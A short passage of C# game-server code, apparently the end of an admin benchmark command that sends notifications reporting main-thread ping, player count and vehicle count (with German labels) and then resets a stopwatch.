            dbPlayer.SendNewNotification($"Main-Thread Ping: {elapsedMs.ToString()}ms", NotificationType.ADMIN, "Benchmark");
            dbPlayer.SendNewNotification($"Spieler: {playerCount.ToString()}", NotificationType.ADMIN, "Benchmark");
            dbPlayer.SendNewNotification($"Fahrzeuge: {vehiclesCount.ToString()}", NotificationType.ADMIN, "Benchmark");

            lStopwatch.Reset();
        }
    }
}
